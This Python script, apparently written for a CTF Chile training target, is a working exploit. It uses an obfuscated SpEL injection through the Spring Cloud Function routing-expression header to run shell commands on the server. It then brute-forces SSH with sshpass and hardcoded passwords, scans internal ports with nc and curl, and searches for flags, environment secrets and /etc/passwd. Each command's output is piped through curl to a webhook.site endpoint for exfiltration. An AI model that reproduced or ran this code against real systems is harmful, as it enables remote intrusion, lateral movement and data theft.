#!/usr/bin/env python3
"""
CTF Chile - Exploración de nuevas redes internas encontradas
IPs: 17.0.0.64, 16.0.0.64, Puerto: 4099
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🌐 EXPLORANDO NUEVAS REDES INTERNAS")
print("=" * 50)

# Crear webhook
r = requests.post("https://webhook.site/token", timeout=10)
UUID = r.json()["uuid"]
WH = f"https://webhook.site/{UUID}"
print(f"Webhook: https://webhook.site/#!/{UUID}")

def execute_rce(cmd, desc=""):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        if desc:
            print(f"    ✓ {desc}")
        return True
    except:
        if desc:
            print(f"    ✗ {desc}")
        return False

print("\n[1/4] Acceso directo con credenciales vault...")

# Intentar SSH a las nuevas IPs con credenciales vault
new_ips = ["17.0.0.64", "16.0.0.64", "10.160.209.1"]
vault_creds = [
    ("vault", "admin123"),
    ("admin", "admin123"),
    ("root", "admin123"),
    ("ctf", "admin123"),
    ("omnivault", "admin123")
]

for ip in new_ips:
    for user, password in vault_creds:
        ip_clean = ip.replace(".", "_")
        cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {user}@{ip} 'echo SUCCESS_SSH_{user.upper()}_{ip_clean} && whoami && pwd && ls -la' 2>&1"
        tag = f"ssh_{user}_{ip.replace('.', '_')}"
        full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/{tag}"
        execute_rce(full_cmd, f"SSH {user}@{ip}")
        time.sleep(2)

print("\n[2/4] Explorando puerto 4099...")

# Puerto 4099 en todas las IPs conocidas
all_ips = ["10.160.209.1", "10.160.209.2", "17.0.0.64", "16.0.0.64", "localhost"]
for ip in all_ips:
    # Verificar si el puerto está abierto
    cmd = f"nc -w 5 {ip} 4099"
    tag = f"port4099_{ip.replace('.', '_')}"
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/{tag}"
    execute_rce(full_cmd, f"Puerto 4099 en {ip}")

    # Intentar HTTP en puerto 4099
    cmd = f"curl -s --connect-timeout 5 http://{ip}:4099/"
    tag = f"http4099_{ip.replace('.', '_')}"
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/{tag}"
    execute_rce(full_cmd, f"HTTP 4099 en {ip}")
    time.sleep(1)

print("\n[3/4] Buscando flags directamente en nuevas redes...")

# Comandos de búsqueda directa de flags a través de SSH si funciona
flag_search_commands = [
    "find / -name '*flag*' 2>/dev/null | head -20 | xargs cat 2>/dev/null",
    "grep -r 'CTF{' / 2>/dev/null | head -10",
    "env | grep -iE '(flag|ctf|secret)'",
    "cat /etc/passwd | grep -E '(flag|ctf)'",
    "find /root /home -name '*.txt' -o -name '*.log' 2>/dev/null | xargs grep -l 'CTF' | head -5 | xargs cat"
]

for ip in new_ips:
    for i, search_cmd in enumerate(flag_search_commands):
        ssh_cmd = f"sshpass -p 'admin123' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no vault@{ip} '{search_cmd}' 2>&1"
        tag = f"flagsearch_{ip.replace('.', '_')}_{i}"
        full_cmd = f"({ssh_cmd}) | curl -s -X POST --data-binary @- {WH}/{tag}"
        execute_rce(full_cmd, f"Búsqueda flags {i+1} en {ip}")
        time.sleep(1.5)

print("\n[4/4] Usando credenciales vault en APIs internas...")

# Probar las credenciales vault en APIs de las nuevas IPs
api_endpoints = [
    "/api/vault", "/api/admin", "/api/secrets", "/api/login", "/admin/vault",
    "/vault", "/vault/secrets", "/api/config", "/admin/config"
]

for ip in new_ips:
    for endpoint in api_endpoints:
        # POST con credenciales
        cmd = f"curl -s -X POST -d 'username=vault&password=admin123' http://{ip}:8080{endpoint}"
        tag = f"api_{ip.replace('.', '_')}{endpoint.replace('/', '_')}"
        full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/{tag}"
        execute_rce(full_cmd, f"API {ip}{endpoint}")
        time.sleep(0.5)

print("\n⏳ Esperando resultados (20s)...")
time.sleep(20)

print("\n" + "="*60)
print("🌐 EXPLORACIÓN DE NUEVAS REDES COMPLETADA")
print("="*60)
print(f"🔗 Webhook: https://webhook.site/#!/{UUID}")
print("")
print("🎯 BUSCAR ESPECÍFICAMENTE:")
print("   • SUCCESS_SSH_* - Conexiones SSH exitosas")
print("   • CTF{ o FLAG{ - Flags encontradas")
print("   • Respuestas HTTP diferentes a errores")
print("   • Servicios activos en puerto 4099")
print("")
print("🏆 SI SSH FUNCIONA EN UNA IP:")
print("   • Esa es la 'bóveda profunda' del CTF")
print("   • Las flags estarán en archivos de ese servidor")
print("="*60)